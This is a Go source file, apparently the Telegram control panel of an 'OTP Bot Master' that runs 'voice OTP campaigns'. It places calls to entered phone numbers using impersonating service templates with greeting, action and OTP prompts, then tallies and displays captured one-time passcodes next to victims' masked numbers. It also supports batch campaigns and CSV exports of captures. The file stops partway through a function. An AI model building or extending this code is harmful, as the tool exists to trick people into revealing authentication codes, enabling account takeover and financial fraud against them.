package bot

import (
	"encoding/json"
	"fmt"
	"log"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/USERNAME/goland-otpbot-api/config"
	"github.com/USERNAME/goland-otpbot-api/models"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

// Callback action types
const (
	ActionMainMenu          = "menu"
	ActionStats             = "stats"
	ActionStatsDetailed     = "stats_detailed"
	ActionCampaigns         = "campaigns"
	ActionCampaignDetails   = "campaign_detail"
	ActionCampaignStop      = "campaign_stop"
	ActionCampaignPause     = "campaign_pause"
	ActionCampaignResume    = "campaign_resume"
	ActionCampaignDelete    = "campaign_delete"
	ActionTemplates         = "templates"
	ActionTemplateDetails   = "template_detail"
	ActionSingleCall        = "call_single"
	ActionCallServiceSelect = "call_service"
	ActionCallConfirm       = "call_confirm"
	ActionCallCancel        = "call_cancel"
	ActionSMS               = "sms"
	ActionExport            = "export"
	ActionBackup            = "backup"
	ActionLogs              = "logs"
	ActionConfig            = "config"
	ActionCleanup           = "cleanup"
	ActionAddTemplate       = "template_add"
	ActionDeleteTemplate    = "template_delete"
	ActionConfirmYes        = "confirm_yes"
	ActionConfirmNo         = "confirm_no"
	ActionHelp              = "help"
	ActionRefresh           = "refresh"
)

// UserState tracks wizard flow state per user
type UserState struct {
	Action    string                 
	Data      map[string]interface{} 
	Step      int                    
	MessageID int                    
	CallbackID string                
	Timestamp time.Time             
}

// BotState manages user states
type BotStateStruct struct {
	states map[int64]*UserState
	mu     sync.RWMutex
}

var botStateGlobal = &BotStateStruct{
	states: make(map[int64]*UserState),
}

// GetUserState returns the current state for a user
func (bs *BotStateStruct) GetUserState(userID int64) (*UserState, bool) {
	bs.mu.RLock()
	defer bs.mu.RUnlock()
	state, exists := bs.states[userID]
	return state, exists
}

// SetUserState sets or updates the state for a user
func (bs *BotStateStruct) SetUserState(userID int64, state *UserState) {
	bs.mu.Lock()
	defer bs.mu.Unlock()
	state.Timestamp = time.Now()
	bs.states[userID] = state
}

// ClearUserState removes the state for a user
func (bs *BotStateStruct) ClearUserState(userID int64) {
	bs.mu.Lock()
	defer bs.mu.Unlock()
	delete(bs.states, userID)
}

// CallbackData holds parsed callback query data
type CallbackData struct {
	Action string
	Data   map[string]string
}

// ParseCallbackData parses callback query data
func ParseCallbackData(data string) (*CallbackData, error) {
	var cb CallbackData
	if err := json.Unmarshal([]byte(data), &cb); err != nil {
		return nil, err
	}
	return &cb, nil
}

// MarshalCallbackData marshals callback data to JSON
func MarshalCallbackData(action string, data map[string]string) string {
	cb := CallbackData{Action: action, Data: data}
	b, _ := json.Marshal(cb)
	return string(b)
}

// sendReplyMarkup sends a message with inline keyboard
func (b *Bot) sendReplyMarkup(chatID int64, text string, keyboard tgbotapi.InlineKeyboardMarkup) error {
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = tgbotapi.ModeMarkdown
	msg.ReplyMarkup = keyboard
	
	_, err := b.telegram.Send(msg)
	if err != nil {
		log.Printf("Failed to send message: %v", err)
	}
	return err
}

// editReplyMarkup edits an existing message with new keyboard
func (b *Bot) editReplyMarkup(chatID int64, messageID int, text string, keyboard *tgbotapi.InlineKeyboardMarkup) error {
	var editMsg tgbotapi.EditMessageTextConfig
	if keyboard != nil {
		editMsg = tgbotapi.NewEditMessageTextAndMarkup(chatID, messageID, text, *keyboard)
	} else {
		editMsg = tgbotapi.NewEditMessageText(chatID, messageID, text)
	}
	editMsg.ParseMode = tgbotapi.ModeMarkdown
	
	_, err := b.telegram.Send(editMsg)
	return err
}

// answerCallback answers a callback query
func (b *Bot) answerCallback(callbackID string, text string, showAlert bool) {
	var answer tgbotapi.CallbackConfig
	if showAlert {
		answer = tgbotapi.NewCallbackWithAlert(callbackID, text)
	} else {
		answer = tgbotapi.NewCallback(callbackID, text)
	}
	b.telegram.Send(answer)
}

// handleCallbackQuery handles all inline keyboard button presses
func (b *Bot) handleCallbackQuery(callback *tgbotapi.CallbackQuery) {
	userID := callback.From.ID

	cb, err := ParseCallbackData(callback.Data)
	if err != nil {
		b.answerCallback(callback.ID, "⚠️ Invalid action", true)
		return
	}

	state, _ := botStateGlobal.GetUserState(userID)

	switch cb.Action {
	case ActionMainMenu:
		botStateGlobal.ClearUserState(userID)
		b.showMainMenu(callback.Message.Chat.ID, callback.Message.MessageID)
	case ActionHelp:
		b.showHelp(callback.Message.Chat.ID, callback.Message.MessageID)
	case ActionRefresh:
		b.refreshCurrentView(callback, userID, state)
	case ActionStats:
		b.showStats(callback.Message.Chat.ID, callback.Message.MessageID)
	case ActionStatsDetailed:
		b.showDetailedStats(callback.Message.Chat.ID, callback.Message.MessageID)
	case ActionCampaigns:
		botStateGlobal.ClearUserState(userID)
		b.showCampaigns(callback.Message.Chat.ID, callback.Message.MessageID)
	case ActionCampaignDetails:
		campaignID, _ := strconv.ParseInt(cb.Data["id"], 10, 64)
		b.showCampaignDetail(callback.Message.Chat.ID, callback.Message.MessageID, campaignID)
	case ActionCampaignStop:
		campaignID, _ := strconv.ParseInt(cb.Data["id"], 10, 64)
		b.confirmAction(callback, userID, ActionCampaignStop, campaignID, "stop this campaign")
	case ActionCampaignPause:
		campaignID, _ := strconv.ParseInt(cb.Data["id"], 10, 64)
		campaign, _ := b.db.GetCampaign(campaignID)
		if campaign != nil {
			b.db.UpdateCampaignStatus(campaignID, string(models.CampaignStatusPaused))
			b.mu.Lock()
			if s, ok := b.campaignState[campaignID]; ok {
				s.mu.Lock()
				s.Status = "paused"
				s.mu.Unlock()
			}
			b.mu.Unlock()
			b.answerCallback(callback.ID, "⏸️ Campaign paused", false)
			b.showCampaignDetail(callback.Message.Chat.ID, callback.Message.MessageID, campaignID)
		}
	case ActionCampaignResume:
		campaignID, _ := strconv.ParseInt(cb.Data["id"], 10, 64)
		campaign, _ := b.db.GetCampaign(campaignID)
		if campaign != nil {
			b.db.UpdateCampaignStatus(campaignID, string(models.CampaignStatusActive))
			b.mu.Lock()
			if s, ok := b.campaignState[campaignID]; ok {
				s.mu.Lock()
				s.Status = "active"
				s.mu.Unlock()
			}
			b.mu.Unlock()
			b.answerCallback(callback.ID, "▶️ Campaign resumed", false)
			b.showCampaignDetail(callback.Message.Chat.ID, callback.Message.MessageID, campaignID)
		}
	case ActionCampaignDelete:
		campaignID, _ := strconv.ParseInt(cb.Data["id"], 10, 64)
		b.confirmAction(callback, userID, ActionCampaignDelete, campaignID, "delete this campaign")
	case ActionTemplates:
		botStateGlobal.ClearUserState(userID)
		b.showTemplates(callback.Message.Chat.ID, callback.Message.MessageID)
	case ActionTemplateDetails:
		b.showTemplateDetail(callback.Message.Chat.ID, callback.Message.MessageID, cb.Data["name"])
	case ActionSingleCall:
		state := &UserState{Action: ActionSingleCall, Step: 1}
		botStateGlobal.SetUserState(userID, state)
		b.showCallWizard(callback.Message.Chat.ID, callback.Message.MessageID, userID)
	case ActionCallServiceSelect:
		service := cb.Data["service"]
		phone := cb.Data["phone"]
		if phone == "" {
			if wizardState, ok := b.callWizardState[userID]; ok {
				phone = wizardState.Phone
			}
		}
		if phone == "" {
			b.answerCallback(callback.ID, "❌ Session expired. Please start again.", true)
			b.showMainMenu(callback.Message.Chat.ID, callback.Message.MessageID)
			return
		}
		b.showCallConfirm(callback.Message.Chat.ID, callback.Message.MessageID, phone, service)
	case ActionCallConfirm:
		b.executeCallWizard(callback, userID)
	case ActionCallCancel:
		botStateGlobal.ClearUserState(userID)
		delete(b.callWizardState, userID)
		b.answerCallback(callback.ID, "❌ Call cancelled", false)
		b.showMainMenu(callback.Message.Chat.ID, callback.Message.MessageID)
	case ActionExport:
		b.doExport(callback)
	case ActionBackup:
		b.doBackup(callback)
	case ActionLogs:
		limit := 20
		if l, ok := cb.Data["limit"]; ok {
			limit, _ = strconv.Atoi(l)
		}
		b.showLogs(callback.Message.Chat.ID, callback.Message.MessageID, limit)
	case ActionConfig:
		b.showConfig(callback.Message.Chat.ID, callback.Message.MessageID)
	case ActionCleanup:
		days := 30
		if d, ok := cb.Data["days"]; ok {
			days, _ = strconv.Atoi(d)
		}
		b.doCleanup(callback, days)
	case ActionAddTemplate:
		b.sendMessage(callback.Message.Chat.ID, "📝 *Add Template*\n\nSend in format:\n`name|voice|greeting|action|otp|confirm`")
	case ActionDeleteTemplate:
		b.confirmDeleteTemplate(callback, userID, cb.Data["name"])
	case ActionConfirmYes:
		b.handleConfirmYes(callback, userID)
	case ActionConfirmNo:
		b.handleConfirmNo(callback, userID)
	}
}

// refreshCurrentView refreshes the current view
func (b *Bot) refreshCurrentView(callback *tgbotapi.CallbackQuery, userID int64, state *UserState) {
	if state == nil {
		b.showMainMenu(callback.Message.Chat.ID, callback.Message.MessageID)
		return
	}
	b.showMainMenu(callback.Message.Chat.ID, callback.Message.MessageID)
}

// showMainMenu shows the main menu with inline keyboard
func (b *Bot) showMainMenu(chatID int64, messageID int) {
	stats, _ := b.db.GetGlobalStats()
	
	text := fmt.Sprintf(`🤖 *OTP Bot Master*

Welcome! I'm here to help you manage your voice OTP campaigns.

📊 *Quick Stats*
├ Active Campaigns: %d
├ Total Captures: %d
└ Success Rate: %.1f%%

👇 *What would you like to do?*`, 
		stats.ActiveCampaigns, stats.TotalCaptures, stats.SuccessRate)

	var keyboard tgbotapi.InlineKeyboardMarkup
	
	keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
		[]tgbotapi.InlineKeyboardButton{
			tgbotapi.NewInlineKeyboardButtonData("📞 Single Call", MarshalCallbackData(ActionSingleCall, nil)),
			tgbotapi.NewInlineKeyboardButtonData("📋 Batch Campaign", MarshalCallbackData(ActionCampaigns, nil)),
		},
		[]tgbotapi.InlineKeyboardButton{
			tgbotapi.NewInlineKeyboardButtonData("📊 Statistics", MarshalCallbackData(ActionStats, nil)),
			tgbotapi.NewInlineKeyboardButtonData("📋 Campaigns", MarshalCallbackData(ActionCampaigns, nil)),
		},
		[]tgbotapi.InlineKeyboardButton{
			tgbotapi.NewInlineKeyboardButtonData("📝 Templates", MarshalCallbackData(ActionTemplates, nil)),
			tgbotapi.NewInlineKeyboardButtonData("💬 SMS", MarshalCallbackData(ActionSMS, nil)),
		},
		[]tgbotapi.InlineKeyboardButton{
			tgbotapi.NewInlineKeyboardButtonData("📥 Export", MarshalCallbackData(ActionExport, nil)),
			tgbotapi.NewInlineKeyboardButtonData("📜 Logs", MarshalCallbackData(ActionLogs, nil)),
		},
		[]tgbotapi.InlineKeyboardButton{
			tgbotapi.NewInlineKeyboardButtonData("⚙️ Settings", MarshalCallbackData(ActionConfig, nil)),
			tgbotapi.NewInlineKeyboardButtonData("❓ Help", MarshalCallbackData(ActionHelp, nil)),
		},
	)

	if messageID > 0 {
		b.editReplyMarkup(chatID, messageID, text, &keyboard)
	} else {
		b.sendReplyMarkup(chatID, text, keyboard)
	}
}

// showHelp shows help with navigation
func (b *Bot) showHelp(chatID int64, messageID int) {
	text := `📖 *Quick Help*

*Making a Call*
1. Click 📞 Single Call
2. Enter phone number
3. Select service template
4. Confirm and send

*Managing Campaigns*
• View all in 📋 Campaigns
• Tap any campaign for details
• Use buttons to Stop/Pause/Delete

*Navigation*
• 🔄 Refresh - Update current view
• 🏠 Menu - Return to main menu
• Any time type /menu`

	var keyboard tgbotapi.InlineKeyboardMarkup
	keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
		{
			tgbotapi.NewInlineKeyboardButtonData("🔄 Refresh", MarshalCallbackData(ActionRefresh, nil)),
			tgbotapi.NewInlineKeyboardButtonData("🏠 Main Menu", MarshalCallbackData(ActionMainMenu, nil)),
		},
	}

	b.editReplyMarkup(chatID, messageID, text, &keyboard)
}

// showStats shows statistics
func (b *Bot) showStats(chatID int64, messageID int) {
	stats, err := b.db.GetGlobalStats()
	if err != nil {
		b.editReplyMarkup(chatID, messageID, "❌ Failed to load statistics", nil)
		return
	}

	text := fmt.Sprintf(`📊 *Statistics Overview*

━━━━━━━━━━━━━━━━━━━━
*📞 Calls*
├ Total: %d
├ Answered: %d
├ Voicemail: %d
└ Failed: %d

━━━━━━━━━━━━━━━━━━━━
*📲 Captures*
├ Total: %d
├ Today: %d
├ Success Rate: %.1f%%

━━━━━━━━━━━━━━━━━━━━
*📋 Campaigns*
├ Total: %d
├ Active: %d
├ Paused: %d
├ Completed: %d`,
		stats.TotalCalls, stats.AnsweredCalls, stats.Voicemails, stats.FailedCalls,
		stats.TotalCaptures, stats.TodayCaptures, stats.SuccessRate,
		stats.TotalCampaigns, stats.ActiveCampaigns, stats.PausedCampaigns, stats.CompletedCampaigns)

	var keyboard tgbotapi.InlineKeyboardMarkup
	keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
		{
			tgbotapi.NewInlineKeyboardButtonData("📥 Export", MarshalCallbackData(ActionExport, nil)),
			tgbotapi.NewInlineKeyboardButtonData("📜 Logs", MarshalCallbackData(ActionLogs, nil)),
		},
		{
			tgbotapi.NewInlineKeyboardButtonData("🔄 Refresh", MarshalCallbackData(ActionStats, nil)),
			tgbotapi.NewInlineKeyboardButtonData("🏠 Main Menu", MarshalCallbackData(ActionMainMenu, nil)),
		},
	}

	b.editReplyMarkup(chatID, messageID, text, &keyboard)
}

// showDetailedStats shows detailed statistics
func (b *Bot) showDetailedStats(chatID int64, messageID int) {
	stats, err := b.db.GetGlobalStats()
	if err != nil {
		b.editReplyMarkup(chatID, messageID, "❌ Failed to load statistics", nil)
		return
	}

	text := fmt.Sprintf(`📊 *Detailed Statistics*

━━━━━━━━━━━━━━━━━━━━
*📞 Call Breakdown*
├ Total: %d
├ Answered: %d
├ Voicemail: %d
└ Failed: %d

━━━━━━━━━━━━━━━━━━━━
*📲 Capture Analysis*
├ Total: %d
├ Today: %d
├ Answer Rate: %.1f%%

━━━━━━━━━━━━━━━━━━━━
*📋 Campaign Status*
├ Total: %d
├ Active: %d
├ Paused: %d
└ Completed: %d`,
		stats.TotalCalls, stats.AnsweredCalls, stats.Voicemails, stats.FailedCalls,
		stats.TotalCaptures, stats.TodayCaptures, stats.SuccessRate,
		stats.TotalCampaigns, stats.ActiveCampaigns, stats.PausedCampaigns, stats.CompletedCampaigns)

	var keyboard tgbotapi.InlineKeyboardMarkup
	keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
		{
			tgbotapi.NewInlineKeyboardButtonData("📥 Export", MarshalCallbackData(ActionExport, nil)),
		},
		{
			tgbotapi.NewInlineKeyboardButtonData("◀ Back", MarshalCallbackData(ActionStats, nil)),
			tgbotapi.NewInlineKeyboardButtonData("🏠 Menu", MarshalCallbackData(ActionMainMenu, nil)),
		},
	}

	b.editReplyMarkup(chatID, messageID, text, &keyboard)
}

// showCampaigns shows campaign list
func (b *Bot) showCampaigns(chatID int64, messageID int) {
	campaigns, err := b.db.GetAllCampaigns()
	if err != nil {
		b.editReplyMarkup(chatID, messageID, "❌ Failed to load campaigns", nil)
		return
	}

	var text string
	if len(campaigns) == 0 {
		text = "📋 *Campaigns*\n\nNo campaigns yet. Start one with 📞 Single Call!"
	} else {
		text = "📋 *Campaigns*\n\n"
		for _, c := range campaigns {
			status := getStatusEmoji(string(c.Status))
			progress := 0
			if c.TotalCalls > 0 {
				progress = (c.Completed * 100) / c.TotalCalls
			}
			text += fmt.Sprintf("%s *%s* (ID: %d)\n", status, c.Name, c.ID)
			text += fmt.Sprintf("   📱 %s | Progress: %d%% | Captures: %d\n\n", c.Service, progress, c.Captures)
		}
	}

	var keyboard tgbotapi.InlineKeyboardMarkup
	if len(campaigns) > 0 {
		for _, c := range campaigns {
			data := map[string]string{"id": strconv.FormatInt(c.ID, 10)}
			keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
				[]tgbotapi.InlineKeyboardButton{
					tgbotapi.NewInlineKeyboardButtonData(
						fmt.Sprintf("📱 %s", c.Name[:min(len(c.Name), 25)]),
						MarshalCallbackData(ActionCampaignDetails, data),
					),
				},
			)
		}
	}
	keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
		[]tgbotapi.InlineKeyboardButton{
			tgbotapi.NewInlineKeyboardButtonData("📞 Single Call", MarshalCallbackData(ActionSingleCall, nil)),
			tgbotapi.NewInlineKeyboardButtonData("🏠 Menu", MarshalCallbackData(ActionMainMenu, nil)),
		},
	)

	b.editReplyMarkup(chatID, messageID, text, &keyboard)
}

// showCampaignDetail shows detailed campaign info with action buttons
func (b *Bot) showCampaignDetail(chatID int64, messageID int, campaignID int64) {
	campaign, err := b.db.GetCampaign(campaignID)
	if err != nil {
		b.editReplyMarkup(chatID, messageID, "❌ Campaign not found", nil)
		return
	}

	answered, voicemails, _, failed, _ := b.db.GetCampaignCallStats(campaignID)
	captures, _ := b.db.GetCapturesByCampaign(campaignID)

	status := getStatusEmoji(string(campaign.Status))
	progress := 0
	if campaign.TotalCalls > 0 {
		progress = (campaign.Completed * 100) / campaign.TotalCalls
	}
	progressBar := createProgressBar(progress)

	var text strings.Builder
	text.WriteString(fmt.Sprintf("%s *%s*\n\n", status, campaign.Name))
	text.WriteString(fmt.Sprintf("%s %d%%\n\n", progressBar, progress))
	text.WriteString(fmt.Sprintf("📱 Service: *%s*\n", campaign.Service))
	text.WriteString(fmt.Sprintf("📞 Total: %d | Done: %d\n", campaign.TotalCalls, campaign.Completed))
	text.WriteString(fmt.Sprintf("✅ Answered: %d | 📬 Voicemail: %d\n", answered, voicemails))
	text.WriteString(fmt.Sprintf("❌ Failed: %d\n", failed))
	text.WriteString(fmt.Sprintf("📲 Captures: *%d*\n", campaign.Captures))
	
	if len(captures) > 0 && len(captures) <= 5 {
		text.WriteString("\n*Recent Captures:*\n")
		for _, c := range captures {
			text.WriteString(fmt.Sprintf("• %s → *%s*\n", maskPhone(c.Phone), c.OTP))
		}
	}

	var keyboard tgbotapi.InlineKeyboardMarkup
	if campaign.Status == "active" {
		keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
			{
				tgbotapi.NewInlineKeyboardButtonData("⏸️ Pause", MarshalCallbackData(ActionCampaignPause, map[string]string{"id": strconv.FormatInt(campaignID, 10)})),
				tgbotapi.NewInlineKeyboardButtonData("🛑 Stop", MarshalCallbackData(ActionCampaignStop, map[string]string{"id": strconv.FormatInt(campaignID, 10)})),
			},
		}
	} else if campaign.Status == "paused" {
		keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
			{
				tgbotapi.NewInlineKeyboardButtonData("▶️ Resume", MarshalCallbackData(ActionCampaignResume, map[string]string{"id": strconv.FormatInt(campaignID, 10)})),
				tgbotapi.NewInlineKeyboardButtonData("🛑 Stop", MarshalCallbackData(ActionCampaignStop, map[string]string{"id": strconv.FormatInt(campaignID, 10)})),
			},
		}
	} else {
		keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
			{
				tgbotapi.NewInlineKeyboardButtonData("🗑️ Delete", MarshalCallbackData(ActionCampaignDelete, map[string]string{"id": strconv.FormatInt(campaignID, 10)})),
			},
		}
	}
	keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
		[]tgbotapi.InlineKeyboardButton{
			tgbotapi.NewInlineKeyboardButtonData("📋 All Campaigns", MarshalCallbackData(ActionCampaigns, nil)),
			tgbotapi.NewInlineKeyboardButtonData("🏠 Menu", MarshalCallbackData(ActionMainMenu, nil)),
		},
	)

	b.editReplyMarkup(chatID, messageID, text.String(), &keyboard)
}

// showTemplates shows template list
func (b *Bot) showTemplates(chatID int64, messageID int) {
	templates, err := b.db.GetAllTemplates()
	if err != nil {
		b.editReplyMarkup(chatID, messageID, "❌ Failed to load templates", nil)
		return
	}

	var text string
	if len(templates) == 0 {
		text = "📝 *Templates*\n\nNo templates yet."
	} else {
		text = "📝 *Service Templates*\n\n"
		for _, t := range templates {
			text += fmt.Sprintf("• *%s* - `%s`\n", t.Name, t.Voice)
		}
	}

	var keyboard tgbotapi.InlineKeyboardMarkup
	for _, t := range templates {
		data := map[string]string{"name": t.Name}
		keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
			[]tgbotapi.InlineKeyboardButton{
				tgbotapi.NewInlineKeyboardButtonData(fmt.Sprintf("📱 %s", t.Name), MarshalCallbackData(ActionTemplateDetails, data)),
			},
		)
	}
	keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
		[]tgbotapi.InlineKeyboardButton{
			tgbotapi.NewInlineKeyboardButtonData("🏠 Menu", MarshalCallbackData(ActionMainMenu, nil)),
		},
	)

	b.editReplyMarkup(chatID, messageID, text, &keyboard)
}

// showTemplateDetail shows template details
func (b *Bot) showTemplateDetail(chatID int64, messageID int, name string) {
	template, err := b.db.GetTemplate(name)
	if err != nil {
		b.editReplyMarkup(chatID, messageID, fmt.Sprintf("❌ Template '%s' not found", name), nil)
		return
	}

	var text strings.Builder
	text.WriteString(fmt.Sprintf("📝 *Template: %s*\n\n", template.Name))
	text.WriteString(fmt.Sprintf("🎤 Voice: `%s`\n\n", template.Voice))
	text.WriteString("*Greeting:*\n")
	text.WriteString(truncate(template.Greeting, 200))
	text.WriteString("\n\n*Action Prompt:*\n")
	text.WriteString(truncate(template.ActionPrompt, 150))

	var keyboard tgbotapi.InlineKeyboardMarkup
	keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
		{
			tgbotapi.NewInlineKeyboardButtonData("📞 Use This", MarshalCallbackData(ActionSingleCall, map[string]string{"preset_service": name})),
			tgbotapi.NewInlineKeyboardButtonData("🗑️ Delete", MarshalCallbackData(ActionDeleteTemplate, map[string]string{"name": name})),
		},
		{
			tgbotapi.NewInlineKeyboardButtonData("📝 All Templates", MarshalCallbackData(ActionTemplates, nil)),
			tgbotapi.NewInlineKeyboardButtonData("🏠 Menu", MarshalCallbackData(ActionMainMenu, nil)),
		},
	}

	b.editReplyMarkup(chatID, messageID, text.String(), &keyboard)
}

// showCallWizard handles the single call wizard flow
func (b *Bot) showCallWizard(chatID int64, messageID int, userID int64) {
	text := "📞 *Single Call*\n\nEnter the phone number to call:\n\nFormat: `+15551234567`\n\n💡 Phone must include country code"

	var keyboard tgbotapi.InlineKeyboardMarkup
	keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
		{
			tgbotapi.NewInlineKeyboardButtonData("❌ Cancel", MarshalCallbackData(ActionCallCancel, nil)),
			tgbotapi.NewInlineKeyboardButtonData("🏠 Menu", MarshalCallbackData(ActionMainMenu, nil)),
		},
	}

	b.editReplyMarkup(chatID, messageID, text, &keyboard)
}

// showCallConfirm shows confirmation before making call
func (b *Bot) showCallConfirm(chatID int64, messageID int, phone, service string) {
	text := fmt.Sprintf("📞 *Confirm Call*\n\nPhone: `%s`\nService: *%s*\n\nReady to initiate the call?", phone, service)

	var keyboard tgbotapi.InlineKeyboardMarkup
	keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
		{
			tgbotapi.NewInlineKeyboardButtonData("✅ Make Call", MarshalCallbackData(ActionCallConfirm, map[string]string{"phone": phone, "service": service})),
		},
		{
			tgbotapi.NewInlineKeyboardButtonData("❌ Cancel", MarshalCallbackData(ActionCallCancel, nil)),
			tgbotapi.NewInlineKeyboardButtonData("🏠 Menu", MarshalCallbackData(ActionMainMenu, nil)),
		},
	}

	b.editReplyMarkup(chatID, messageID, text, &keyboard)
}

// executeCallWizard executes the call after confirmation
func (b *Bot) executeCallWizard(callback *tgbotapi.CallbackQuery, userID int64) {
	cb, err := ParseCallbackData(callback.Data)
	if err != nil {
		b.answerCallback(callback.ID, "❌ Session error", true)
		return
	}

	phone := cb.Data["phone"]
	service := cb.Data["service"]

	if !phoneRegex.MatchString(phone) {
		b.answerCallback(callback.ID, "❌ Invalid phone number", true)
		return
	}

	_, err = b.db.GetTemplate(service)
	if err != nil {
		b.answerCallback(callback.ID, fmt.Sprintf("❌ Template '%s' not found", service), true)
		return
	}

	campaignID, err := b.db.CreateCampaign("Single Call - "+phone, service, 1)
	if err != nil {
		b.answerCallback(callback.ID, "❌ Failed to create campaign", true)
		return
	}

	callID, err := b.db.CreateCall(campaignID, phone)
	if err != nil {
		b.answerCallback(callback.ID, "❌ Failed to create call", true)
		return
	}

	b.callQueue <- CallJob{
		CampaignID: campaignID,
		CallID:     callID,
		Phone:      phone,
	}

	botStateGlobal.ClearUserState(userID)
	delete(b.callWizardState, userID)

	b.answerCallback(callback.ID, "📞 Call initiated!", false)
	
	text := fmt.Sprintf("✅ *Call Initiated!*\n\nPhone: `%s`\nService: *%s*\n\nCheck /campaigns for status", phone, service)
	b.sendReplyMarkup(callback.Message.Chat.ID, text, tgbotapi.InlineKeyboardMarkup{
		InlineKeyboard: [][]tgbotapi.InlineKeyboardButton{
			{
				tgbotapi.NewInlineKeyboardButtonData("📋 View Campaigns", MarshalCallbackData(ActionCampaigns, nil)),
				tgbotapi.NewInlineKeyboardButtonData("🏠 Menu", MarshalCallbackData(ActionMainMenu, nil)),
			},
		},
	})
}

// showLogs shows logs
func (b *Bot) showLogs(chatID int64, messageID int, limit int) {
	logs, err := b.db.GetLogs(limit)
	if err != nil {
		b.editReplyMarkup(chatID, messageID, "❌ Failed to load logs", nil)
		return
	}

	var text string
	if len(logs) == 0 {
		text = "📜 *Logs*\n\nNo logs yet"
	} else {
		text = fmt.Sprintf("📜 *Recent Logs* (last %d)\n\n", limit)
		for _, l := range logs {
			emoji := "ℹ️"
			if l.Level == "ERROR" {
				emoji = "❌"
			} else if l.Level == "WARNING" {
				emoji = "⚠️"
			}
			text += fmt.Sprintf("%s [%s] %s\n", emoji, l.CreatedAt.Format("15:04:05"), truncate(l.Message, 60))
		}
	}

	var keyboard tgbotapi.InlineKeyboardMarkup
	keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
		{
			tgbotapi.NewInlineKeyboardButtonData("🔄 Refresh", MarshalCallbackData(ActionLogs, map[string]string{"limit": strconv.Itoa(limit)})),
			tgbotapi.NewInlineKeyboardButtonData("🏠 Menu", MarshalCallbackData(ActionMainMenu, nil)),
		},
	}

	b.editReplyMarkup(chatID, messageID, text, &keyboard)
}

// showConfig shows configuration
func (b *Bot) showConfig(chatID int64, messageID int) {
	cfg, err := config.Get()
	if err != nil {
		b.editReplyMarkup(chatID, messageID, "❌ Failed to load configuration", nil)
		return
	}

	var text strings.Builder
	text.WriteString("⚙️ *Configuration*\n\n")
	text.WriteString(fmt.Sprintf("📱 Port: `%s`\n", cfg.Port))
	text.WriteString(fmt.Sprintf("🗄️ Database: `%s`\n", cfg.DatabasePath))
	text.WriteString(fmt.Sprintf("⚡ Concurrency: `%d`\n", cfg.Concurrency))
	text.WriteString(fmt.Sprintf("🔄 Max Retries: `%d`\n", cfg.MaxRetries))
	text.WriteString(fmt.Sprintf("⏱️ Call Timeout: `%ds`\n", cfg.CallTimeout))
	text.WriteString(fmt.Sprintf("🔗 Ngrok URL: `%s`\n", cfg.NgrokURL))
	text.WriteString(fmt.Sprintf("👥 Admins: %d configured", len(cfg.AdminIDs)))

	var keyboard tgbotapi.InlineKeyboardMarkup
	keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
		{
			tgbotapi.NewInlineKeyboardButtonData("🧹 Cleanup", MarshalCallbackData(ActionCleanup, map[string]string{"days": "30"})),
		},
		{
			tgbotapi.NewInlineKeyboardButtonData("🏠 Menu", MarshalCallbackData(ActionMainMenu, nil)),
		},
	}

	b.editReplyMarkup(chatID, messageID, text.String(), &keyboard)
}

// doExport exports captures
func (b *Bot) doExport(callback *tgbotapi.CallbackQuery) {
	csv, err := b.db.ExportCapturesMasked()
	if err != nil {
		b.answerCallback(callback.ID, fmt.Sprintf("❌ Export failed: %v", err), true)
		return
	}

	doc := tgbotapi.NewDocument(callback.Message.Chat.ID, tgbotapi.FileBytes{
		Name:  fmt.Sprintf("captures_%s.csv", time.Now().Format("2006-01-02")),
		Bytes: []byte(csv),
	})
	doc.Caption = "📥 OTP Captures Export (Phone numbers masked)"
	b.telegram.Send(doc)

	b.answerCallback(callback.ID, "✅ Export sent!", false)
}

// doBackup creates database backup
func (b *Bot) doBackup(callback *tgbotapi.CallbackQuery) {
	b.doExport(callback)
}

// doCleanup cleans up old data
func (b *Bot) doCleanup(callback *tgbotapi.CallbackQuery, days int) {
	deleted, err := b.db.CleanupOldCaptures(days)
	if err != nil {
		b.answerCallback(callback.ID, fmt.Sprintf("❌ Cleanup failed: %v", err), true)
		return
	}

	b.answerCallback(callback.ID, fmt.Sprintf("✅ Cleaned up %d old captures", deleted), false)
	b.showConfig(callback.Message.Chat.ID, callback.Message.MessageID)
}

// confirmDeleteTemplate shows confirmation for template deletion
func (b *Bot) confirmDeleteTemplate(callback *tgbotapi.CallbackQuery, userID int64, name string) {
	text := fmt.Sprintf("⚠️ *Delete Template*\n\nAre you sure you want to delete template *%s*?\n\nThis action cannot be undone.", name)

	var keyboard tgbotapi.InlineKeyboardMarkup
	keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
		{
			tgbotapi.NewInlineKeyboardButtonData("✅ Yes, Delete", MarshalCallbackData(ActionConfirmYes, map[string]string{"action": "delete_template", "name": name})),
			tgbotapi.NewInlineKeyboardButtonData("❌ Cancel", MarshalCallbackData(ActionConfirmNo, nil)),
		},
	}

	b.editReplyMarkup(callback.Message.Chat.ID, callback.Message.MessageID, text, &keyboard)
}

// confirmAction shows confirmation for an action
func (b *Bot) confirmAction(callback *tgbotapi.CallbackQuery, userID int64, action string, campaignID int64, description string) {
	text := fmt.Sprintf("⚠️ *Confirm Action*\n\nAre you sure you want to %s?\n\nThis action cannot be undone.", description)

	state := &UserState{
		Action: action,
		Data:   map[string]interface{}{"campaign_id": float64(campaignID)},
	}
	botStateGlobal.SetUserState(userID, state)

	var keyboard tgbotapi.InlineKeyboardMarkup
